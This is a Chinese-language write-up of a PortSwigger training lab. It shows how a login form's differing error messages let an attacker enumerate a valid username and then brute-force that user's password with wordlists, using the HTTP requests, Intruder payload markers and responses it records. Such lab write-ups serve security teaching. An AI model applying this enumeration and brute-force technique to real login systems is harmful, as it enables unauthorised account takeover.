# 实验：通过不同响应进行用户名枚举

本实验存在用户名枚举和密码暴力破解攻击漏洞。它有一个具有可预测用户名和密码的账户，可以在以下单词列表中找到：

-   [候选用户名](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [候选密码](https://portswigger.net/web-security/authentication/auth-lab-passwords)

为了解决本实验，请枚举一个有效的用户名，暴力破解该用户的密码，然后访问其账户页面。

## 步骤

进行任意登录尝试
- 请求
    ```http
    POST /login HTTP/2

    username=test_username&password=test_password
    ```

- 响应
    ```http
    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 3244

    <p class=is-warning>
        Invalid username
    </p>
    ```

    - 响应揭示用户名是否有效

将请求发送到攻击器，对用户名使用字典进行爆破
    `username=§test_username§&password=test_password`
- 服务器响应均为 200
- 响应长度有1条为独特长度
    - 响应体内容
        ```html
        <p class=is-warning>
            Incorrect password
        </p>
        ````

    - 响应揭示密码是否有效

设置得到的有效用户名，对密码使用字典进行爆破
    `username=albuquerque&password=§test_password§`
- 服务器大量 200 响应中拥有1条独特的 302 响应
    - 服务器响应设置 cookie 并重定向到账户页面
        ```http
        HTTP/2 302 Found
        Location: /my-account?id=albuquerque
        Set-Cookie: session=yVzMnKh0kXdacPBhOJ7WX8NAEI4LoZUL; Secure; HttpOnly; SameSite=None
        ```
